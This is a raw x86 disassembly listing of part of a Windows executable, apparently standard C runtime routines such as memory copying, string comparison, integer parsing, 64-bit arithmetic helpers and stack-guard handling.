  4269f4:	mov    al,BYTE PTR [esi+0x1]
  4269f7:	mov    BYTE PTR [edi+0x1],al
  4269fa:	mov    eax,DWORD PTR [ebp+0x8]
  4269fd:	pop    esi
  4269fe:	pop    edi
  4269ff:	leave  
  426a00:	ret    
  426a01:	lea    ecx,[ecx+0x0]
  426a04:	mov    al,BYTE PTR [esi]
  426a06:	mov    BYTE PTR [edi],al
  426a08:	mov    al,BYTE PTR [esi+0x1]
  426a0b:	mov    BYTE PTR [edi+0x1],al
  426a0e:	mov    al,BYTE PTR [esi+0x2]
  426a11:	mov    BYTE PTR [edi+0x2],al
  426a14:	mov    eax,DWORD PTR [ebp+0x8]
  426a17:	pop    esi
  426a18:	pop    edi
  426a19:	leave  
  426a1a:	ret    
  426a1b:	nop
  426a1c:	lea    esi,[ecx+esi*1-0x4]
  426a20:	lea    edi,[ecx+edi*1-0x4]
  426a24:	test   edi,0x3
  426a2a:	jne    0x426a50
  426a2c:	shr    ecx,0x2
  426a2f:	and    edx,0x3
  426a32:	cmp    ecx,0x8
  426a35:	jb     0x426a44
  426a37:	std    
  426a38:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a3a:	cld    
  426a3b:	jmp    DWORD PTR [edx*4+0x426b68]
  426a42:	mov    edi,edi
  426a44:	neg    ecx
  426a46:	jmp    DWORD PTR [ecx*4+0x426b18]
  426a4d:	lea    ecx,[ecx+0x0]
  426a50:	mov    eax,edi
  426a52:	mov    edx,0x3
  426a57:	cmp    ecx,0x4
  426a5a:	jb     0x426a68
  426a5c:	and    eax,0x3
  426a5f:	sub    ecx,eax
  426a61:	jmp    DWORD PTR [eax*4+0x426a6c]
  426a68:	jmp    DWORD PTR [ecx*4+0x426b68]
  426a6f:	nop
  426a70:	jl     0x426adc
  426a72:	inc    edx
  426a73:	add    BYTE PTR [eax-0x37ffbd96],ah
  426a79:	push   0x42
  426a7b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a81:	mov    BYTE PTR [edi+0x3],al
  426a84:	sub    esi,0x1
  426a87:	shr    ecx,0x2
  426a8a:	sub    edi,0x1
  426a8d:	cmp    ecx,0x8
  426a90:	jb     0x426a44
  426a92:	std    
  426a93:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a95:	cld    
  426a96:	jmp    DWORD PTR [edx*4+0x426b68]
  426a9d:	lea    ecx,[ecx+0x0]
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	and    edx,ecx
  426aa5:	mov    BYTE PTR [edi+0x3],al
  426aa8:	mov    al,BYTE PTR [esi+0x2]
  426aab:	shr    ecx,0x2
  426aae:	mov    BYTE PTR [edi+0x2],al
  426ab1:	sub    esi,0x2
  426ab4:	sub    edi,0x2
  426ab7:	cmp    ecx,0x8
  426aba:	jb     0x426a44
  426abc:	std    
  426abd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426abf:	cld    
  426ac0:	jmp    DWORD PTR [edx*4+0x426b68]
  426ac7:	nop
  426ac8:	mov    al,BYTE PTR [esi+0x3]
  426acb:	and    edx,ecx
  426acd:	mov    BYTE PTR [edi+0x3],al
  426ad0:	mov    al,BYTE PTR [esi+0x2]
  426ad3:	mov    BYTE PTR [edi+0x2],al
  426ad6:	mov    al,BYTE PTR [esi+0x1]
  426ad9:	shr    ecx,0x2
  426adc:	mov    BYTE PTR [edi+0x1],al
  426adf:	sub    esi,0x3
  426ae2:	sub    edi,0x3
  426ae5:	cmp    ecx,0x8
  426ae8:	jb     0x426a44
  426aee:	std    
  426aef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426af1:	cld    
  426af2:	jmp    DWORD PTR [edx*4+0x426b68]
  426af9:	lea    ecx,[ecx+0x0]
  426afc:	sbb    al,0x6b
  426afe:	inc    edx
  426aff:	add    BYTE PTR [ebx+ebp*2],ah
  426b02:	inc    edx
  426b03:	add    BYTE PTR [ebx+ebp*2],ch
  426b06:	inc    edx
  426b07:	add    BYTE PTR [ebx+ebp*2],dh
  426b0a:	inc    edx
  426b0b:	add    BYTE PTR [ebx+ebp*2],bh
  426b0e:	inc    edx
  426b0f:	add    BYTE PTR [ebx+ebp*2+0x42],al
  426b13:	add    BYTE PTR [ebx+ebp*2+0x42],cl
  426b17:	add    BYTE PTR [edi+0x6b],bl
  426b1a:	inc    edx
  426b1b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b21:	inc    esp
  426b22:	(bad)  
  426b23:	sbb    al,0x8b
  426b25:	inc    esp
  426b26:	mov    ds,WORD PTR [eax]
  426b28:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b2c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b30:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b34:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b40:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426b44:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b48:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b4c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b50:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b54:	lea    eax,[ecx*4+0x0]
  426b5b:	add    esi,eax
  426b5d:	add    edi,eax
  426b5f:	jmp    DWORD PTR [edx*4+0x426b68]
  426b66:	mov    edi,edi
  426b68:	js     0x426bd5
  426b6a:	inc    edx
  426b6b:	add    BYTE PTR [eax-0x6fffbd95],al
  426b71:	imul   eax,DWORD PTR [edx+0x0],0xffffffa4
  426b75:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b79:	inc    ebp
  426b7a:	or     BYTE PTR [esi+0x5f],bl
  426b7d:	leave  
  426b7e:	ret    
  426b7f:	nop
  426b80:	mov    al,BYTE PTR [esi+0x3]
  426b83:	mov    BYTE PTR [edi+0x3],al
  426b86:	mov    eax,DWORD PTR [ebp+0x8]
  426b89:	pop    esi
  426b8a:	pop    edi
  426b8b:	leave  
  426b8c:	ret    
  426b8d:	lea    ecx,[ecx+0x0]
  426b90:	mov    al,BYTE PTR [esi+0x3]
  426b93:	mov    BYTE PTR [edi+0x3],al
  426b96:	mov    al,BYTE PTR [esi+0x2]
  426b99:	mov    BYTE PTR [edi+0x2],al
  426b9c:	mov    eax,DWORD PTR [ebp+0x8]
  426b9f:	pop    esi
  426ba0:	pop    edi
  426ba1:	leave  
  426ba2:	ret    
  426ba3:	nop
  426ba4:	mov    al,BYTE PTR [esi+0x3]
  426ba7:	mov    BYTE PTR [edi+0x3],al
  426baa:	mov    al,BYTE PTR [esi+0x2]
  426bad:	mov    BYTE PTR [edi+0x2],al
  426bb0:	mov    al,BYTE PTR [esi+0x1]
  426bb3:	mov    BYTE PTR [edi+0x1],al
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	pop    esi
  426bba:	pop    edi
  426bbb:	leave  
  426bbc:	ret    
  426bbd:	push   ebp
  426bbe:	mov    ebp,esp
  426bc0:	sub    esp,0xc
  426bc3:	mov    eax,ds:0x45f510
  426bc8:	xor    eax,DWORD PTR [ebp+0x4]
  426bcb:	and    BYTE PTR [ebp-0x6],0x0
  426bcf:	push   0x6
  426bd1:	mov    DWORD PTR [ebp-0x4],eax
  426bd4:	lea    eax,[ebp-0xc]
  426bd7:	push   eax
  426bd8:	push   0x1004
  426bdd:	push   DWORD PTR [ebp+0x8]
  426be0:	call   DWORD PTR ds:0x428108
  426be6:	test   eax,eax
  426be8:	jne    0x426bef
  426bea:	or     eax,0xffffffff
  426bed:	jmp    0x426bf9
  426bef:	lea    eax,[ebp-0xc]
  426bf2:	push   eax
  426bf3:	call   0x426efe
  426bf8:	pop    ecx
  426bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  426bfc:	xor    ecx,DWORD PTR [ebp+0x4]
  426bff:	call   0x42400c
  426c04:	leave  
  426c05:	ret    
  426c06:	push   0x38
  426c08:	push   0x428ee8
  426c0d:	call   0x423940
  426c12:	mov    eax,ds:0x45f510
  426c17:	xor    eax,DWORD PTR [ebp+0x4]
  426c1a:	mov    DWORD PTR [ebp-0x1c],eax
  426c1d:	xor    edi,edi
  426c1f:	mov    DWORD PTR [ebp-0x20],edi
  426c22:	mov    DWORD PTR [ebp-0x24],edi
  426c25:	mov    eax,DWORD PTR [ebp+0x14]
  426c28:	mov    ebx,DWORD PTR [eax]
  426c2a:	mov    DWORD PTR [ebp-0x28],ebx
  426c2d:	mov    DWORD PTR [ebp-0x2c],edi
  426c30:	mov    eax,DWORD PTR [ebp+0x8]
  426c33:	cmp    eax,DWORD PTR [ebp+0xc]
  426c36:	je     0x426daf
  426c3c:	lea    ecx,[ebp-0x40]
  426c3f:	push   ecx
  426c40:	push   eax
  426c41:	mov    esi,DWORD PTR ds:0x4280d4
  426c47:	call   esi
  426c49:	test   eax,eax
  426c4b:	je     0x426c6d
  426c4d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c51:	jne    0x426c6d
  426c53:	lea    eax,[ebp-0x40]
  426c56:	push   eax
  426c57:	push   DWORD PTR [ebp+0xc]
  426c5a:	call   esi
  426c5c:	test   eax,eax
  426c5e:	je     0x426c6d
  426c60:	cmp    DWORD PTR [ebp-0x40],0x1
  426c64:	jne    0x426c6d
  426c66:	mov    DWORD PTR [ebp-0x2c],0x1
  426c6d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c70:	je     0x426c8c
  426c72:	cmp    ebx,0xffffffff
  426c75:	je     0x426c7b
  426c77:	mov    esi,ebx
  426c79:	jmp    0x426c87
  426c7b:	push   DWORD PTR [ebp+0x10]
  426c7e:	call   0x423f50
  426c83:	pop    ecx
  426c84:	mov    esi,eax
  426c86:	inc    esi
  426c87:	mov    DWORD PTR [ebp-0x44],esi
  426c8a:	jmp    0x426c8f
  426c8c:	mov    esi,DWORD PTR [ebp-0x44]
  426c8f:	cmp    DWORD PTR [ebp-0x2c],edi
  426c92:	jne    0x426cae
  426c94:	push   edi
  426c95:	push   edi
  426c96:	push   ebx
  426c97:	push   DWORD PTR [ebp+0x10]
  426c9a:	push   0x1
  426c9c:	push   DWORD PTR [ebp+0x8]
  426c9f:	call   DWORD PTR ds:0x4280f8
  426ca5:	mov    esi,eax
  426ca7:	mov    DWORD PTR [ebp-0x44],esi
  426caa:	cmp    esi,edi
  426cac:	je     0x426d06
  426cae:	mov    DWORD PTR [ebp-0x4],edi
  426cb1:	lea    eax,[esi+esi*1]
  426cb4:	add    eax,0x3
  426cb7:	and    eax,0xfffffffc
  426cba:	call   0x423990
  426cbf:	mov    DWORD PTR [ebp-0x18],esp
  426cc2:	mov    ebx,esp
  426cc4:	mov    DWORD PTR [ebp-0x48],ebx
  426cc7:	lea    eax,[esi+esi*1]
  426cca:	push   eax
  426ccb:	push   edi
  426ccc:	push   ebx
  426ccd:	call   0x426240
  426cd2:	add    esp,0xc
  426cd5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cd9:	jmp    0x426cf2
  426cdb:	xor    eax,eax
  426cdd:	inc    eax
  426cde:	ret    
  426cdf:	mov    esp,DWORD PTR [ebp-0x18]
  426ce2:	call   0x426dd5
  426ce7:	xor    edi,edi
  426ce9:	xor    ebx,ebx
  426ceb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cef:	mov    esi,DWORD PTR [ebp-0x44]
  426cf2:	cmp    ebx,edi
  426cf4:	jne    0x426d14
  426cf6:	push   esi
  426cf7:	push   0x2
  426cf9:	call   0x424a58
  426cfe:	pop    ecx
  426cff:	pop    ecx
  426d00:	mov    ebx,eax
  426d02:	cmp    ebx,edi
  426d04:	jne    0x426d0d
  426d06:	xor    eax,eax
  426d08:	jmp    0x426dc1
  426d0d:	mov    DWORD PTR [ebp-0x24],0x1
  426d14:	push   esi
  426d15:	push   ebx
  426d16:	push   DWORD PTR [ebp-0x28]
  426d19:	push   DWORD PTR [ebp+0x10]
  426d1c:	push   0x1
  426d1e:	push   DWORD PTR [ebp+0x8]
  426d21:	call   DWORD PTR ds:0x4280f8
  426d27:	test   eax,eax
  426d29:	je     0x426db2
  426d2f:	cmp    DWORD PTR [ebp+0x18],edi
  426d32:	je     0x426d54
  426d34:	push   edi
  426d35:	push   edi
  426d36:	push   DWORD PTR [ebp+0x1c]
  426d39:	push   DWORD PTR [ebp+0x18]
  426d3c:	push   esi
  426d3d:	push   ebx
  426d3e:	push   edi
  426d3f:	push   DWORD PTR [ebp+0xc]
  426d42:	call   DWORD PTR ds:0x428088
  426d48:	test   eax,eax
  426d4a:	je     0x426db2
  426d4c:	mov    eax,DWORD PTR [ebp+0x18]
  426d4f:	mov    DWORD PTR [ebp-0x20],eax
  426d52:	jmp    0x426db2
  426d54:	cmp    DWORD PTR [ebp-0x2c],edi
  426d57:	jne    0x426d6f
  426d59:	push   edi
  426d5a:	push   edi
  426d5b:	push   edi
  426d5c:	push   edi
  426d5d:	push   esi
  426d5e:	push   ebx
  426d5f:	push   edi
  426d60:	push   DWORD PTR [ebp+0xc]
  426d63:	call   DWORD PTR ds:0x428088
  426d69:	mov    esi,eax
  426d6b:	cmp    esi,edi
  426d6d:	je     0x426db2
  426d6f:	push   esi
  426d70:	push   0x1
  426d72:	call   0x424a58
  426d77:	pop    ecx
  426d78:	pop    ecx
  426d79:	mov    DWORD PTR [ebp-0x20],eax
  426d7c:	cmp    eax,edi
  426d7e:	je     0x426db2
  426d80:	push   edi
  426d81:	push   edi
  426d82:	push   esi
  426d83:	push   eax
  426d84:	push   esi
  426d85:	push   ebx
  426d86:	push   edi
  426d87:	push   DWORD PTR [ebp+0xc]
  426d8a:	call   DWORD PTR ds:0x428088
  426d90:	cmp    eax,edi
  426d92:	jne    0x426da2
  426d94:	push   DWORD PTR [ebp-0x20]
  426d97:	call   0x42454a
  426d9c:	pop    ecx
  426d9d:	mov    DWORD PTR [ebp-0x20],edi
  426da0:	jmp    0x426db2
  426da2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426da6:	je     0x426db2
  426da8:	mov    ecx,DWORD PTR [ebp+0x14]
  426dab:	mov    DWORD PTR [ecx],eax
  426dad:	jmp    0x426db2
  426daf:	mov    ebx,DWORD PTR [ebp-0x48]
  426db2:	cmp    DWORD PTR [ebp-0x24],edi
  426db5:	je     0x426dbe
  426db7:	push   ebx
  426db8:	call   0x42454a
  426dbd:	pop    ecx
  426dbe:	mov    eax,DWORD PTR [ebp-0x20]
  426dc1:	lea    esp,[ebp-0x54]
  426dc4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dc7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dca:	call   0x42400c
  426dcf:	call   0x42397b
  426dd4:	ret    
  426dd5:	push   ebp
  426dd6:	mov    ebp,esp
  426dd8:	sub    esp,0x48
  426ddb:	push   ebx
  426ddc:	push   esi
  426ddd:	push   edi
  426dde:	push   0x4
  426de0:	pop    eax
  426de1:	call   0x423990
  426de6:	mov    ebx,esp
  426de8:	push   0x1c
  426dea:	lea    eax,[ebp-0x24]
  426ded:	push   eax
  426dee:	push   ebx
  426def:	call   DWORD PTR ds:0x42803c
  426df5:	test   eax,eax
  426df7:	je     0x426e6a
  426df9:	mov    edi,DWORD PTR [ebp-0x20]
  426dfc:	lea    eax,[ebp-0x48]
  426dff:	push   eax
  426e00:	call   DWORD PTR ds:0x428040
  426e06:	mov    eax,DWORD PTR [ebp-0x44]
  426e09:	lea    esi,[eax-0x1]
  426e0c:	not    esi
  426e0e:	and    esi,ebx
  426e10:	sub    esi,eax
  426e12:	mov    DWORD PTR [ebp-0x4],eax
  426e15:	mov    eax,ds:0x45fba4
  426e1a:	mov    ecx,eax
  426e1c:	dec    ecx
  426e1d:	neg    ecx
  426e1f:	sbb    ecx,ecx
  426e21:	and    ecx,0xffff1000
  426e27:	add    ecx,0x11000
  426e2d:	add    ecx,edi
  426e2f:	cmp    esi,ecx
  426e31:	jb     0x426e6a
  426e33:	cmp    eax,0x1
  426e36:	je     0x426e82
  426e38:	mov    ebx,edi
  426e3a:	mov    edi,0x1000
  426e3f:	push   0x1c
  426e41:	lea    eax,[ebp-0x24]
  426e44:	push   eax
  426e45:	push   ebx
  426e46:	call   DWORD PTR ds:0x42803c
  426e4c:	test   eax,eax
  426e4e:	je     0x426e6a
  426e50:	add    ebx,DWORD PTR [ebp-0x18]
  426e53:	test   DWORD PTR [ebp-0x14],edi
  426e56:	je     0x426e3f
  426e58:	test   BYTE PTR [ebp-0xf],0x1
  426e5c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e5f:	je     0x426e66
  426e61:	xor    eax,eax
  426e63:	inc    eax
  426e64:	jmp    0x426e9e
  426e66:	cmp    esi,ebx
  426e68:	jae    0x426e6e
  426e6a:	xor    eax,eax
  426e6c:	jmp    0x426e9e
  426e6e:	push   0x4
  426e70:	push   edi
  426e71:	push   DWORD PTR [ebp-0x4]
  426e74:	push   ebx
  426e75:	call   DWORD PTR ds:0x42802c
  426e7b:	mov    eax,ds:0x45fba4
  426e80:	jmp    0x426e84
  426e82:	mov    ebx,esi
  426e84:	dec    eax
  426e85:	neg    eax
  426e87:	sbb    eax,eax
  426e89:	and    eax,0x103
  426e8e:	lea    ecx,[ebp-0x8]
  426e91:	push   ecx
  426e92:	inc    eax
  426e93:	push   eax
  426e94:	push   DWORD PTR [ebp-0x4]
  426e97:	push   ebx
  426e98:	call   DWORD PTR ds:0x428050
  426e9e:	lea    esp,[ebp-0x54]
  426ea1:	pop    edi
  426ea2:	pop    esi
  426ea3:	pop    ebx
  426ea4:	leave  
  426ea5:	ret    
  426ea6:	int3   
  426ea7:	int3   
  426ea8:	int3   
  426ea9:	int3   
  426eaa:	int3   
  426eab:	int3   
  426eac:	int3   
  426ead:	int3   
  426eae:	int3   
  426eaf:	int3   
  426eb0:	push   ebp
  426eb1:	mov    ebp,esp
  426eb3:	push   edi
  426eb4:	push   esi
  426eb5:	push   ebx
  426eb6:	mov    esi,DWORD PTR [ebp+0xc]
  426eb9:	mov    edi,DWORD PTR [ebp+0x8]
  426ebc:	mov    al,0xff
  426ebe:	mov    edi,edi
  426ec0:	or     al,al
  426ec2:	je     0x426ef6
  426ec4:	mov    al,BYTE PTR [esi]
  426ec6:	add    esi,0x1
  426ec9:	mov    ah,BYTE PTR [edi]
  426ecb:	add    edi,0x1
  426ece:	cmp    ah,al
  426ed0:	je     0x426ec0
  426ed2:	sub    al,0x41
  426ed4:	cmp    al,0x1a
  426ed6:	sbb    cl,cl
  426ed8:	and    cl,0x20
  426edb:	add    al,cl
  426edd:	add    al,0x41
  426edf:	xchg   al,ah
  426ee1:	sub    al,0x41
  426ee3:	cmp    al,0x1a
  426ee5:	sbb    cl,cl
  426ee7:	and    cl,0x20
  426eea:	add    al,cl
  426eec:	add    al,0x41
  426eee:	cmp    al,ah
  426ef0:	je     0x426ec0
  426ef2:	sbb    al,al
  426ef4:	sbb    al,0xff
  426ef6:	movsx  eax,al
  426ef9:	pop    ebx
  426efa:	pop    esi
  426efb:	pop    edi
  426efc:	leave  
  426efd:	ret    
  426efe:	push   esi
  426eff:	push   edi
  426f00:	call   0x4237f3
  426f05:	mov    edi,DWORD PTR [eax+0x64]
  426f08:	cmp    edi,DWORD PTR ds:0x45f66c
  426f0e:	je     0x426f17
  426f10:	call   0x424c9f
  426f15:	mov    edi,eax
  426f17:	mov    esi,DWORD PTR [esp+0xc]
  426f1b:	cmp    DWORD PTR [edi+0x28],0x1
  426f1f:	movzx  eax,BYTE PTR [esi]
  426f22:	jle    0x426f32
  426f24:	push   0x8
  426f26:	push   eax
  426f27:	push   edi
  426f28:	call   0x426f86
  426f2d:	add    esp,0xc
  426f30:	jmp    0x426f3c
  426f32:	mov    ecx,DWORD PTR [edi+0x48]
  426f35:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f39:	and    eax,0x8
  426f3c:	test   eax,eax
  426f3e:	je     0x426f43
  426f40:	inc    esi
  426f41:	jmp    0x426f1b
  426f43:	movzx  ecx,BYTE PTR [esi]
  426f46:	inc    esi
  426f47:	cmp    ecx,0x2d
  426f4a:	mov    edx,ecx
  426f4c:	je     0x426f53
  426f4e:	cmp    ecx,0x2b
  426f51:	jne    0x426f57
  426f53:	movzx  ecx,BYTE PTR [esi]
  426f56:	inc    esi
  426f57:	xor    eax,eax
  426f59:	cmp    ecx,0x30
  426f5c:	jl     0x426f68
  426f5e:	cmp    ecx,0x39
  426f61:	jg     0x426f68
  426f63:	sub    ecx,0x30
  426f66:	jmp    0x426f6b
  426f68:	or     ecx,0xffffffff
  426f6b:	cmp    ecx,0xffffffff
  426f6e:	je     0x426f7c
  426f70:	lea    eax,[eax+eax*4]
  426f73:	lea    eax,[ecx+eax*2]
  426f76:	movzx  ecx,BYTE PTR [esi]
  426f79:	inc    esi
  426f7a:	jmp    0x426f59
  426f7c:	cmp    edx,0x2d
  426f7f:	pop    edi
  426f80:	pop    esi
  426f81:	jne    0x426f85
  426f83:	neg    eax
  426f85:	ret    
  426f86:	push   ebp
  426f87:	mov    ebp,esp
  426f89:	push   ecx
  426f8a:	mov    eax,DWORD PTR [ebp+0xc]
  426f8d:	lea    ecx,[eax+0x1]
  426f90:	cmp    ecx,0x100
  426f96:	mov    ecx,DWORD PTR [ebp+0x8]
  426f99:	ja     0x426fa4
  426f9b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f9e:	movzx  eax,WORD PTR [ecx+eax*2]
  426fa2:	jmp    0x426ff8
  426fa4:	push   esi
  426fa5:	mov    edx,eax
  426fa7:	sar    edx,0x8
  426faa:	push   edi
  426fab:	mov    edi,DWORD PTR [ecx+0x48]
  426fae:	movzx  esi,dl
  426fb1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fb6:	pop    edi
  426fb7:	pop    esi
  426fb8:	je     0x426fc9
  426fba:	and    BYTE PTR [ebp-0x2],0x0
  426fbe:	push   0x2
  426fc0:	mov    BYTE PTR [ebp-0x3],al
  426fc3:	mov    BYTE PTR [ebp-0x4],dl
  426fc6:	pop    eax
  426fc7:	jmp    0x426fd3
  426fc9:	and    BYTE PTR [ebp-0x3],0x0
  426fcd:	mov    BYTE PTR [ebp-0x4],al
  426fd0:	xor    eax,eax
  426fd2:	inc    eax
  426fd3:	push   0x1
  426fd5:	push   DWORD PTR [ecx+0x14]
  426fd8:	push   DWORD PTR [ecx+0x4]
  426fdb:	lea    ecx,[ebp+0xe]
  426fde:	push   ecx
  426fdf:	push   eax
  426fe0:	lea    eax,[ebp-0x4]
  426fe3:	push   eax
  426fe4:	push   0x1
  426fe6:	call   0x426068
  426feb:	add    esp,0x1c
  426fee:	test   eax,eax
  426ff0:	jne    0x426ff4
  426ff2:	leave  
  426ff3:	ret    
  426ff4:	movzx  eax,WORD PTR [ebp+0xe]
  426ff8:	and    eax,DWORD PTR [ebp+0x10]
  426ffb:	leave  
  426ffc:	ret    
  426ffd:	int3   
  426ffe:	int3   
  426fff:	int3   
  427000:	mov    eax,DWORD PTR [esp+0x8]
  427004:	mov    ecx,DWORD PTR [esp+0x10]
  427008:	or     ecx,eax
  42700a:	mov    ecx,DWORD PTR [esp+0xc]
  42700e:	jne    0x427019
  427010:	mov    eax,DWORD PTR [esp+0x4]
  427014:	mul    ecx
  427016:	ret    0x10
  427019:	push   ebx
  42701a:	mul    ecx
  42701c:	mov    ebx,eax
  42701e:	mov    eax,DWORD PTR [esp+0x8]
  427022:	mul    DWORD PTR [esp+0x14]
  427026:	add    ebx,eax
  427028:	mov    eax,DWORD PTR [esp+0x8]
  42702c:	mul    ecx
  42702e:	add    edx,ebx
  427030:	pop    ebx
  427031:	ret    0x10
  427034:	int3   
  427035:	int3   
  427036:	int3   
  427037:	int3   
  427038:	int3   
  427039:	int3   
  42703a:	int3   
  42703b:	int3   
  42703c:	int3   
  42703d:	int3   
  42703e:	int3   
  42703f:	int3   
  427040:	push   ebp
  427041:	mov    ebp,esp
  427043:	push   edi
  427044:	push   esi
  427045:	push   ebx
  427046:	mov    ecx,DWORD PTR [ebp+0x10]
  427049:	or     ecx,ecx
  42704b:	je     0x42709a
  42704d:	mov    esi,DWORD PTR [ebp+0x8]
  427050:	mov    edi,DWORD PTR [ebp+0xc]
  427053:	mov    bh,0x41
  427055:	mov    bl,0x5a
  427057:	mov    dh,0x20
  427059:	lea    ecx,[ecx+0x0]
  42705c:	mov    ah,BYTE PTR [esi]
  42705e:	or     ah,ah
  427060:	mov    al,BYTE PTR [edi]
  427062:	je     0x42708b
  427064:	or     al,al
  427066:	je     0x42708b
  427068:	add    esi,0x1
  42706b:	add    edi,0x1
  42706e:	cmp    ah,bh
  427070:	jb     0x427078
  427072:	cmp    ah,bl
  427074:	ja     0x427078
  427076:	add    ah,dh
  427078:	cmp    al,bh
  42707a:	jb     0x427082
  42707c:	cmp    al,bl
  42707e:	ja     0x427082
  427080:	add    al,dh
  427082:	cmp    ah,al
  427084:	jne    0x427091
  427086:	sub    ecx,0x1
  427089:	jne    0x42705c
  42708b:	xor    ecx,ecx
  42708d:	cmp    ah,al
  42708f:	je     0x42709a
  427091:	mov    ecx,0xffffffff
  427096:	jb     0x42709a
  427098:	neg    ecx
  42709a:	mov    eax,ecx
  42709c:	pop    ebx
  42709d:	pop    esi
  42709e:	pop    edi
  42709f:	leave  
  4270a0:	ret    
  4270a1:	int3   
  4270a2:	int3   
  4270a3:	int3   
  4270a4:	int3   
  4270a5:	int3   
  4270a6:	int3   
  4270a7:	int3   
  4270a8:	int3   
  4270a9:	int3   
  4270aa:	int3   
  4270ab:	int3   
  4270ac:	int3   
  4270ad:	int3   
  4270ae:	int3   
  4270af:	int3   
  4270b0:	push   esi
  4270b1:	mov    eax,DWORD PTR [esp+0x14]
  4270b5:	or     eax,eax
  4270b7:	jne    0x4270e1
  4270b9:	mov    ecx,DWORD PTR [esp+0x10]
  4270bd:	mov    eax,DWORD PTR [esp+0xc]
  4270c1:	xor    edx,edx
  4270c3:	div    ecx
  4270c5:	mov    ebx,eax
  4270c7:	mov    eax,DWORD PTR [esp+0x8]
  4270cb:	div    ecx
  4270cd:	mov    esi,eax
  4270cf:	mov    eax,ebx
  4270d1:	mul    DWORD PTR [esp+0x10]
  4270d5:	mov    ecx,eax
  4270d7:	mov    eax,esi
  4270d9:	mul    DWORD PTR [esp+0x10]
  4270dd:	add    edx,ecx
  4270df:	jmp    0x427128
  4270e1:	mov    ecx,eax
  4270e3:	mov    ebx,DWORD PTR [esp+0x10]
  4270e7:	mov    edx,DWORD PTR [esp+0xc]
  4270eb:	mov    eax,DWORD PTR [esp+0x8]
  4270ef:	shr    ecx,1
  4270f1:	rcr    ebx,1
  4270f3:	shr    edx,1
  4270f5:	rcr    eax,1
  4270f7:	or     ecx,ecx
  4270f9:	jne    0x4270ef
  4270fb:	div    ebx
  4270fd:	mov    esi,eax
  4270ff:	mul    DWORD PTR [esp+0x14]
  427103:	mov    ecx,eax
  427105:	mov    eax,DWORD PTR [esp+0x10]
  427109:	mul    esi
  42710b:	add    edx,ecx
  42710d:	jb     0x42711d
  42710f:	cmp    edx,DWORD PTR [esp+0xc]
  427113:	ja     0x42711d
  427115:	jb     0x427126
  427117:	cmp    eax,DWORD PTR [esp+0x8]
  42711b:	jbe    0x427126
  42711d:	dec    esi
  42711e:	sub    eax,DWORD PTR [esp+0x10]
  427122:	sbb    edx,DWORD PTR [esp+0x14]
  427126:	xor    ebx,ebx
  427128:	sub    eax,DWORD PTR [esp+0x8]
  42712c:	sbb    edx,DWORD PTR [esp+0xc]
  427130:	neg    edx
  427132:	neg    eax
  427134:	sbb    edx,0x0
  427137:	mov    ecx,edx
  427139:	mov    edx,ebx
  42713b:	mov    ebx,ecx
  42713d:	mov    ecx,eax
  42713f:	mov    eax,esi
  427141:	pop    esi
  427142:	ret    0x10
  427145:	int3   
  427146:	int3   
  427147:	int3   
  427148:	int3   
  427149:	int3   
  42714a:	int3   
  42714b:	int3   
  42714c:	int3   
  42714d:	int3   
  42714e:	int3   
  42714f:	int3   
  427150:	lea    eax,[edx-0x1]
  427153:	pop    ebx
  427154:	ret    
  427155:	lea    esp,[esp+0x0]
  42715c:	lea    esp,[esp+0x0]
  427160:	xor    eax,eax
  427162:	mov    al,BYTE PTR [esp+0x8]
  427166:	push   ebx
  427167:	mov    ebx,eax
  427169:	shl    eax,0x8
  42716c:	mov    edx,DWORD PTR [esp+0x8]
  427170:	test   edx,0x3
  427176:	je     0x42718d
  427178:	mov    cl,BYTE PTR [edx]
  42717a:	add    edx,0x1
  42717d:	cmp    cl,bl
  42717f:	je     0x427150
  427181:	test   cl,cl
  427183:	je     0x4271d6
  427185:	test   edx,0x3
  42718b:	jne    0x427178
  42718d:	or     ebx,eax
  42718f:	push   edi
  427190:	mov    eax,ebx
  427192:	shl    ebx,0x10
  427195:	push   esi
  427196:	or     ebx,eax
  427198:	mov    ecx,DWORD PTR [edx]
  42719a:	mov    edi,0x7efefeff
  42719f:	mov    eax,ecx
  4271a1:	mov    esi,edi
  4271a3:	xor    ecx,ebx
  4271a5:	add    esi,eax
  4271a7:	add    edi,ecx
  4271a9:	xor    ecx,0xffffffff
  4271ac:	xor    eax,0xffffffff
  4271af:	xor    ecx,edi
  4271b1:	xor    eax,esi
  4271b3:	add    edx,0x4
  4271b6:	and    ecx,0x81010100
  4271bc:	jne    0x4271da
  4271be:	and    eax,0x81010100
  4271c3:	je     0x427198
  4271c5:	and    eax,0x1010100
  4271ca:	jne    0x4271d4
  4271cc:	and    esi,0x80000000
  4271d2:	jne    0x427198
  4271d4:	pop    esi
  4271d5:	pop    edi
  4271d6:	pop    ebx
  4271d7:	xor    eax,eax
